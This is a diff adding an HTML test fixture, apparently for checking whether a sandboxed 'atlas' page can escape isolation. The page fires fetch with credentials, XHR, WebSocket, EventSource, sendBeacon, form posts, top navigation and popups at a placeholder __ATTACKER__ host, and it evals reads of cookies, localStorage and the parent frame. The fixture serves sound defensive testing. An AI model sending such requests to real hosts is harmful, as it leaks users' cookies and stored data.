@@ -1,0 +1,88 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Hostile network probe</title>
+  <style>
+    @import url("__ATTACKER__/css-import");
+    body { background: url("__ATTACKER__/css-background"); }
+  </style>
+</head>
+<body>
+  <img src="__ATTACKER__/image" alt="hostile image">
+  <form action="__ATTACKER__/form" method="post" target="_self">
+    <input type="text" name="secret" value="fictional">
+    <input id="submit-form" type="submit" value="Submit">
+  </form>
+  <a id="top-link" href="__ATTACKER__/top" target="_top">Top</a>
+  <a id="blank-link" href="__ATTACKER__/blank" target="_blank">Blank</a>
+  <script>
+    const attacker = "__ATTACKER__";
+    const attempts = [];
+    const record = (name, promise) => {
+      attempts.push(name);
+      Promise.resolve(promise).catch(() => {});
+    };
+    record("fetch", fetch(attacker + "/fetch", { credentials: "include" }));
+    record("xhr", new Promise((resolve, reject) => {
+      const request = new XMLHttpRequest();
+      request.open("GET", attacker + "/xhr");
+      request.onload = resolve;
+      request.onerror = reject;
+      request.send();
+    }));
+    try {
+      const socket = new WebSocket(attacker.replace("http", "ws") + "/websocket");
+      socket.onopen = () => attempts.push("websocket");
+      socket.onerror = () => {};
+    } catch (error) {
+      attempts.push("websocket-threw");
+    }
+    try {
+      const source = new EventSource(attacker + "/event-source");
+      source.onopen = () => attempts.push("event-source");
+      source.onerror = () => source.close();
+    } catch (error) {
+      attempts.push("event-source-threw");
+    }
+    try {
+      if (navigator.sendBeacon(attacker + "/beacon", "fictional")) {
+        attempts.push("beacon");
+      }
+    } catch (error) {
+      attempts.push("beacon-threw");
+    }
+    try {
+      top.location = attacker + "/top-navigation";
+      attempts.push("top-navigation-assigned");
+    } catch (error) {
+      attempts.push("top-navigation-threw");
+    }
+    try {
+      const popup = window.open(attacker + "/popup");
+      if (popup) attempts.push("popup-opened");
+    } catch (error) {
+      attempts.push("popup-threw");
+    }
+    const access = {};
+    for (const [name, expression] of [
+      ["cookie", "document.cookie"],
+      ["localStorage", "localStorage.atlas"],
+      ["parentDocument", "parent.document.title"],
+      ["parentLocalStorage", "parent.localStorage.atlas"],
+    ]) {
+      try {
+        access[name] = String(eval(expression));
+      } catch (error) {
+        access[name] = error.name;
+      }
+    }
+    window.__atlasSecurity = {
+      attempts,
+      access,
+      origin: self.origin,
+      serviceWorker: navigator.serviceWorker !== undefined,
+    };
+  </script>
+</body>
+</html>
